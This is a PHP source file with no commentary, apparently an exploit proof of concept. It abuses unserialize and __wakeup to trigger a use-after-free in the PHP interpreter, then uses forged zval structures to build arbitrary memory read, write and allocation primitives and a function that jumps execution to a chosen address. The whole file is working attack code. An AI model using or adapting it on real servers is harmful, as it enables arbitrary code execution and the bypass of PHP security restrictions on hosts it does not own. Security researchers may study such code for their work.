<?php

function nogc($x) {
	global $ngc;
	if(!isset($ngc)) $ngc=[];
	array_push($ngc,$x);
}

class x {
	public $y;
	function __wakeup() {
		unset($this->y);
	}
}

function uaf($i) {
	$a=new x;
	$a->y=[1];
	$a=[$a, $i, &$a->y[0]];
	return unserialize(serialize($a));
}

function ibuf($ptr, $sz)
{
    $out = "";
    for ($i=0; $i<$sz; $i++) {
        $out .= chr($ptr & 0xff);
        $ptr >>= 8;
    }
    return $out;
}

function zval($a, $b, $c, $r=1) {
	$r = ibuf($a,8) . ibuf($b,8) . ibuf($r,4) . ibuf($c, 1) .  ibuf(0,3);
	return $r;
}

function ptr($i) {
	$ret=uaf(1);
	$x=[1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1];
	return $ret[2];
}

function map($addr,$sz) {
	$z = zval($addr, $sz, 6 /* string */);
	nogc($z);
	$x=uaf($z);
	nogc($x);
	return [&$x[2]];
}

function alloc($size) {
	$pt = ptr($x) + 0;
	$x = [str_repeat("AXBX", ($size/4)+128)];
	nogc($x);
	$mp = map($pt, 0x2000);
	$ptx=strpos($mp[0], "AXBX");
	$mp[0][$ptx] = "O";
	if($x[0][0] == "O") {
		$rmp = array();
		$rmp['val'] = &map($pt+$ptx,$size)[0];
		$rmp['ptr'] = $pt+$ptx;
		return $rmp;
	}
	return 0;
}

function memcpy($out, $in, $sz) {
	for($i=0;$i<$sz;$i++) {
		$out['val'][$i] = $in[$i];
	}
}

function jump($addr) { 
	$al = alloc(16);
	memcpy($al, ibuf(0,8).ibuf($addr,8), 16);
	$zv = zval(0, $al['ptr'], 5, 0);
	nogc($zv);
	uaf($zv);
}

?>

